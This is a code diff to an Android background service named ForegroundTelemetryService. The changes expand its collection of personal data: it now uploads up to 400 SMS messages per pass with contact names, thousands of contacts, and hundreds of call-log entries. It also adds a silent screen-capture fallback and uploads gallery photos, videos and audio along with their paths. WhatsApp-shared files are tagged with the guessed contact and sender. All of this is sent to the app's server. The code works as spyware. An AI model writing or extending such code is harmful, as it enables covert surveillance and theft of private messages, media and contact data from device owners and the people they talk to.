@@ -73,6 +73,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
     private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
+    private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
     private static final long NORMAL_LOOP_MS = 30_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
@@ -199,6 +200,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private String currentToken() {
         return prefs().getString("auth_token", null);
+    }
+
+    private String normalizePhoneNumber(String value) {
+        if (value == null) return "";
+        return value.replaceAll("\\D+", "");
     }
 
     private JSONObject eventBody(String type, JSONObject payload) throws Exception {
@@ -449,6 +455,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception e) {
             Log.e(TAG, "captureAndUploadScreenFrame err", e);
             try {
+                captureAndUploadScreenImage(sessionId);
+            } catch (Exception fallbackError) {
+                Log.e(TAG, "captureAndUploadScreenImage fallback err", fallbackError);
+            }
+            try {
                 JSONObject ctx = new JSONObject();
                 ctx.put("sessionId", sessionId);
                 ctx.put("error", e.getClass().getSimpleName());
@@ -469,6 +480,69 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             }
             screenRecorder = null;
             if (screenRecorderFile != null && screenRecorderFile.exists()) screenRecorderFile.delete();
+        }
+    }
+
+    private void captureAndUploadScreenImage(String sessionId) throws Exception {
+        if (mediaProjection == null) return;
+        long startedAt = System.currentTimeMillis();
+        DisplayMetrics dm = getResources().getDisplayMetrics();
+        int width = Math.max(480, Math.min(1080, dm.widthPixels));
+        int height = Math.max(800, Math.min(1920, dm.heightPixels));
+        int density = Math.max(1, dm.densityDpi);
+        ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        VirtualDisplay display = mediaProjection.createVirtualDisplay(
+                "remote-screen-fallback",
+                width,
+                height,
+                density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                reader.getSurface(),
+                null,
+                null
+        );
+        Image image = null;
+        try {
+            Thread.sleep(450L);
+            image = reader.acquireLatestImage();
+            if (image == null) throw new IllegalStateException("screen_image_unavailable");
+            byte[] jpeg = imageToJpeg(image);
+            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_screen_image");
+            Map<String, String> form = new HashMap<>();
+            form.put("captureMode", "remote_live");
+            form.put("captureKind", "screen");
+            form.put("supportSessionId", sessionId);
+            form.put("segmentStartedAtMs", String.valueOf(startedAt));
+            form.put("segmentDurationMs", "1");
+            JSONObject metadata = new JSONObject();
+            metadata.put("source", "MediaProjection");
+            metadata.put("transport", "jpeg_fallback");
+            metadata.put("capturedAtMs", startedAt);
+            form.put("metadataJson", metadata.toString());
+            String filename = "remote_screen_" + sessionId + "_" + startedAt + ".jpg";
+            String res = HttpClient.uploadFile(
+                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
+                    "media",
+                    filename,
+                    jpeg,
+                    "image/jpeg",
+                    form,
+                    currentToken()
+            );
+            JSONObject parsed = new JSONObject(res != null ? res : "{}");
+            if (parsed.optBoolean("ok")) {
+                prefs().edit().putLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
+            }
+        } finally {
+            if (image != null) image.close();
+            try {
+                display.release();
+            } catch (Exception ignored) {
+            }
+            try {
+                reader.close();
+            } catch (Exception ignored) {
+            }
         }
     }
 
@@ -828,22 +902,34 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             Cursor cur = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
             if (cur == null) return;
 
-            int max = 200;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 4000 && queued < 400) {
                 try {
                     String addr = cur.getString(cur.getColumnIndexOrThrow("address"));
                     String bodyTxt = cur.getString(cur.getColumnIndexOrThrow("body"));
                     long ts = cur.getLong(cur.getColumnIndexOrThrow("date"));
-                    String key = "sms|" + addr + "|" + ts + "|" + (bodyTxt != null ? bodyTxt.hashCode() : 0);
+                    int type = -1;
+                    try {
+                        type = cur.getInt(cur.getColumnIndexOrThrow("type"));
+                    } catch (Exception ignored) {
+                    }
+                    String key = "sms|" + addr + "|" + ts + "|" + type + "|" + (bodyTxt != null ? bodyTxt.hashCode() : 0);
                     if (sent.contains(key)) continue;
 
                     JSONObject payload = new JSONObject();
                     payload.put("from", addr);
+                    String contactName = lookupContactName(addr);
+                    if (contactName != null && contactName.trim().length() > 0) payload.put("contactName", contactName);
                     payload.put("body", bodyTxt);
+                    payload.put("source", "sms");
+                    payload.put("syncKey", key);
+                    payload.put("boxType", type);
                     payload.put("ts", ts);
                     sendOrQueue("sms", payload);
 
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "sms item err", e);
                 }
@@ -876,13 +962,15 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             );
             if (cur == null) return;
 
-            int max = 1000;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 6000 && queued < 2000) {
                 try {
                     String name = cur.getString(0);
                     String number = cur.getString(1);
                     String contactId = cur.getString(2);
-                    String key = (contactId != null && contactId.length() > 0) ? contactId : (number != null ? number : name);
+                    String normalizedNumber = normalizePhoneNumber(number);
+                    String key = (contactId != null && contactId.length() > 0) ? contactId : (!normalizedNumber.isEmpty() ? normalizedNumber : (number != null ? number : name));
                     if (key == null || key.trim().length() == 0 || sent.contains(key)) continue;
 
                     JSONObject payload = new JSONObject();
@@ -892,6 +980,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     payload.put("ts", System.currentTimeMillis());
                     sendOrQueue("contact", payload);
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "contact item err", e);
                 }
@@ -915,8 +1004,9 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             Cursor cur = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
             if (cur == null) return;
 
-            int max = 250;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 4000 && queued < 500) {
                 try {
                     String number = cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                     int type = cur.getInt(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
@@ -937,6 +1027,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     payload.put("direction", callDirectionLabel(type));
                     payload.put("typeLabel", callDirectionLabel(type));
                     payload.put("duration", duration);
+                    payload.put("syncKey", key);
                     payload.put("ts", ts);
                     String contactName = cachedName != null && cachedName.trim().length() > 0 ? cachedName : lookupContactName(number);
                     if (contactName != null && contactName.trim().length() > 0) {
@@ -945,6 +1036,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     sendOrQueue("call", payload);
 
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "call item err", e);
                 }
@@ -1001,7 +1093,14 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             while (it.hasNext()) uploaded.add(it.next());
 
             ContentResolver cr = getContentResolver();
-            String[] projection = {MediaStore.MediaColumns._ID, MediaStore.MediaColumns.MIME_TYPE};
+            String[] projection = {
+                    MediaStore.MediaColumns._ID,
+                    MediaStore.MediaColumns.MIME_TYPE,
+                    MediaStore.MediaColumns.DISPLAY_NAME,
+                    MediaStore.MediaColumns.RELATIVE_PATH,
+                    MediaStore.MediaColumns.SIZE,
+                    MediaStore.MediaColumns.DATE_ADDED
+            };
 
             uploadMediaCursor(cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), true, "gallery_image", cr, uploaded, uploadedObj, sp, deviceId, token);
             uploadMediaCursor(cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_video", cr, uploaded, uploadedObj, sp, deviceId, token);
@@ -1020,39 +1119,78 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 if (++count > 500) break;
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                 String mime = null;
+                String displayName = null;
+                String relativePath = null;
+                long sizeBytes = 0L;
+                long dateAddedSeconds = 0L;
                 try {
                     mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
                 } catch (Exception ignored) {
                 }
+                try {
+                    displayName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
+                } catch (Exception ignored) {
+                }
+                try {
+                    relativePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH));
+                } catch (Exception ignored) {
+                }
+                try {
+                    sizeBytes = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
+                } catch (Exception ignored) {
+                }
+                try {
+                    dateAddedSeconds = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED));
+                } catch (Exception ignored) {
+                }
 
-                Uri uri = ContentUris.withAppendedId(image ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI : MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id);
+                Uri baseUri;
+                if (image) {
+                    baseUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                } else if ("gallery_audio".equals(origin)) {
+                    baseUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+                } else {
+                    baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+                }
+                Uri uri = ContentUris.withAppendedId(baseUri, id);
                 try (InputStream is = cr.openInputStream(uri)) {
                     if (is == null) continue;
                     byte[] data = readAllBytes(is);
                     String hash = sha256(data);
                     if (hash == null || uploaded.contains(hash)) continue;
 
-                    try {
-                        JSONObject checksumBody = new JSONObject();
-                        checksumBody.put("checksum", hash);
-                        String checksumResp = HttpClient.postJson(ApiConfig.api("/api/media/checksum"), checksumBody.toString(), token);
-                        JSONObject parsed = new JSONObject(checksumResp != null ? checksumResp : "{}");
-                        if (parsed.optBoolean("exists")) {
-                            uploaded.add(hash);
-                            uploadedObj.put(hash, true);
-                            sp.edit().putString(KEY_UPLOADED_MEDIA_HASHES, uploadedObj.toString()).apply();
-                            continue;
-                        }
-                    } catch (Exception e) {
-                        Log.w(TAG, "checksum lookup failed, continuing upload", e);
-                    }
-
                     String ext = ".bin";
                     if (mime != null && mime.contains("/")) ext = "." + mime.substring(mime.indexOf("/") + 1);
-                    String filename = ("gallery_audio".equals(origin) ? "aud_" : (image ? "img_" : "vid_")) + id + ext;
+                    String filename = (displayName != null && displayName.trim().length() > 0)
+                            ? displayName
+                            : (("gallery_audio".equals(origin) ? "aud_" : (image ? "img_" : "vid_")) + id + ext);
                     String url = ApiConfig.api("/api/media/" + deviceId + "/upload");
                     long startedAt = System.currentTimeMillis();
-                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, token);
+                    java.util.Map<String, String> form = new java.util.HashMap<>();
+                    form.put("captureMode", "device_library");
+                    form.put("captureKind", origin);
+                    JSONObject metadata = new JSONObject();
+                    metadata.put("source", "MediaStoreScan");
+                    metadata.put("origin", origin);
+                    metadata.put("displayName", displayName);
+                    metadata.put("relativePath", relativePath);
+                    metadata.put("sizeBytes", sizeBytes > 0 ? sizeBytes : data.length);
+                    if (dateAddedSeconds > 0) metadata.put("dateAddedMs", dateAddedSeconds * 1000L);
+                    String relativePathLower = relativePath != null ? relativePath.toLowerCase() : "";
+                    boolean isWhatsappSharedMedia = relativePathLower.contains("whatsapp")
+                            || relativePathLower.contains("com.whatsapp")
+                            || relativePathLower.contains("com.whatsapp.w4b");
+                    if (isWhatsappSharedMedia) {
+                        metadata.put("sourceApp", "whatsapp_shared_media");
+                        JSONObject whatsappContext = findRecentWhatsappContext(dateAddedSeconds > 0 ? dateAddedSeconds * 1000L : System.currentTimeMillis());
+                        if (whatsappContext != null) {
+                            metadata.put("whatsappContact", whatsappContext.optString("contactName", null));
+                            metadata.put("whatsappSender", whatsappContext.optString("senderName", null));
+                            metadata.put("whatsappDirection", whatsappContext.optString("direction", "received"));
+                        }
+                    }
+                    form.put("metadataJson", metadata.toString());
+                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, form, token);
                     JSONObject jr = new JSONObject(resp != null ? resp : "{}");
                     if (jr.optBoolean("ok")) {
                         uploaded.add(hash);
@@ -1082,6 +1220,30 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             }
         } finally {
             cursor.close();
+        }
+    }
+
+    private JSONObject findRecentWhatsappContext(long mediaTimestampMs) {
+        try {
+            JSONArray arr = new JSONArray(prefs().getString(KEY_RECENT_WHATSAPP_CONTACTS, "[]"));
+            JSONObject best = null;
+            long bestDelta = Long.MAX_VALUE;
+            for (int i = 0; i < arr.length(); i++) {
+                JSONObject row = arr.optJSONObject(i);
+                if (row == null) continue;
+                long ts = row.optLong("ts", 0L);
+                if (ts <= 0L) continue;
+                long delta = Math.abs(ts - mediaTimestampMs);
+                if (delta > 15 * 60 * 1000L) continue;
+                if (delta < bestDelta) {
+                    best = row;
+                    bestDelta = delta;
+                }
+            }
+            return best;
+        } catch (Exception e) {
+            Log.e(TAG, "findRecentWhatsappContext err", e);
+            return null;
         }
     }
 
